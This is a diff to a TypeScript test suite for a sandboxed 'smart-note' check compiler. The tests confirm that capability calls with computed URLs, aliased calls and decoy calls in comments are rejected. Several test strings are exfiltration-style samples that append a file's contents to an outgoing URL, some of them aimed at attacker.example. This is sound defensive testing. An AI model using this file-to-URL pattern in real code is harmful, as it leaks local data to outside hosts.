@@ -204,11 +204,28 @@ describe("compileSmartNoteCheck", () => {
         expect(client.session.prompt).toHaveBeenCalledTimes(1);
     });
 
-    test("refuses a computed httpGet URL before the host request runs", async () => {
+    test("rejects a computed httpGet URL before any code runs", async () => {
         const httpGet = mock(async () => ({ status: 200, body: "ok" }));
         const client = createCompilerClient([
             compilerOutput(
                 `function check(cap) { cap.httpGet("https://example.com/?d=" + cap.readFile("ready.txt")); return { met: true }; }`,
+            ),
+        ]);
+
+        const result = await compileSmartNoteCheck(
+            compileArgs(client, { capabilityFactory: () => ({ ...fakeCap, httpGet }) }),
+        );
+
+        expect(result.ok).toBe(false);
+        if (!result.ok) expect(result.error).toContain("must be a single string literal");
+        expect(httpGet).not.toHaveBeenCalled();
+    });
+
+    test("refuses an aliased capability call with a computed URL at the host boundary", async () => {
+        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
+        const client = createCompilerClient([
+            compilerOutput(
+                `function check(cap) { const get = cap.httpGet; get("https://example.com/?d=" + cap.readFile("ready.txt")); return { met: true }; }`,
             ),
         ]);
 
@@ -264,6 +281,39 @@ describe("enforceLiteralCapabilityArguments", () => {
         );
         expect(readFile).toHaveBeenCalledTimes(1);
         expect(httpGet).toHaveBeenCalledTimes(2);
+    });
+
+    test("fails closed when the check names its parameter something other than cap", async () => {
+        const readFile = mock(async () => "ready");
+        const code = `function check(c) { return { met: c.readFile("ready.txt") === "ready" }; }`;
+        const cap = enforceLiteralCapabilityArguments(code, () => ({ ...fakeCap, readFile }))(
+            new AbortController().signal,
+        );
+
+        await expect(cap.readFile("ready.txt")).rejects.toThrow(/not a string literal/);
+        expect(readFile).not.toHaveBeenCalled();
+    });
+
+    test("does not admit decoy call sites written in comments or strings", async () => {
+        const httpGet = mock(async () => ({ status: 200, body: "ok" }));
+        const code = `// cap.httpGet("https://attacker.example/1")
+        /* cap.httpGet("https://attacker.example/0") */
+        function check(cap) {
+            const note = 'cap.httpGet("https://attacker.example/2")';
+            return { met: note.length > 0 };
+        }`;
+        const cap = enforceLiteralCapabilityArguments(code, () => ({ ...fakeCap, httpGet }))(
+            new AbortController().signal,
+        );
+
+        for (const url of [
+            "https://attacker.example/0",
+            "https://attacker.example/1",
+            "https://attacker.example/2",
+        ]) {
+            await expect(cap.httpGet(url)).rejects.toThrow(/not a string literal/);
+        }
+        expect(httpGet).not.toHaveBeenCalled();
     });
 });
 
@@ -366,21 +416,44 @@ describe("smart-note compiler output bounds", () => {
         expect(normalizeCron("  ")).toBe("0 * * * *");
     });
 
-    test("rejects clock reads and Math.random in the compiled check", () => {
-        expect(() =>
-            normalizeCompiledCheck(`function check() { return { met: Date.now() > 1 }; }`),
-        ).toThrow(/clock/);
-        expect(() =>
-            normalizeCompiledCheck(`function check() { return { met: new Date() > 1 }; }`),
-        ).toThrow(/clock/);
-        expect(() =>
-            normalizeCompiledCheck(`function check() { return { met: Math.random() > 0.5 }; }`),
-        ).toThrow(/Math\.random/);
+    test("rejects capability call sites whose argument is not one string literal", () => {
+        for (const call of [
+            `cap.httpGet(url)`,
+            `cap.httpGet("https://x/?d=" + cap.readFile("a.txt"))`,
+            `cap.httpGet(\`https://x/\${id}\`)`,
+            `cap.readFile("a.txt", extra)`,
+            `cap.readFile(/re/)`,
+        ]) {
+            expect(() =>
+                normalizeCompiledCheck(`function check(cap) { ${call}; return { met: true }; }`),
+            ).toThrow(/must be a single string literal/);
+        }
         expect(
             normalizeCompiledCheck(
-                `function check() { return { met: new Date("2026-01-01") < new Date("2026-06-01") }; }`,
+                `function check(cap) { cap.readFile("a.txt"); cap.httpGet('https://x/a'); cap.httpGet(\`https://x/b\`); return { met: true }; }`,
             ),
-        ).toContain("function check()");
+        ).toContain("function check(cap)");
+    });
+
+    test("ignores module keywords and call-like text inside strings and comments", () => {
+        const code = `// import nothing; cap.httpGet("https://decoy.example/comment")
+function check(cap) {
+  /* require("fs") is only mentioned here */
+  const source = cap.readFile("source.js") || "";
+  const usesCommonJs = source.includes("require") || /import\\s/.test(source);
+  return { met: usesCommonJs && !source.includes("cap.readFile(\\"decoy\\")") };
+}`;
+        expect(normalizeCompiledCheck(code)).toBe(code);
+        expect(manifestAdvisoryWarnings(code, { capabilities: ["readFile"] })).toEqual([
+            "manifest omits readFile path source.js",
+        ]);
+    });
+
+    test("decodes escape sequences in literal capability arguments", () => {
+        const code = `function check(cap) { return { met: cap.readFile("docs\\u002Fa\\x2Db\\n.txt") !== null }; }`;
+        expect(manifestAdvisoryWarnings(code, { capabilities: ["readFile"] })).toEqual([
+            "manifest omits readFile path docs/a-b\n.txt",
+        ]);
     });
 });
 
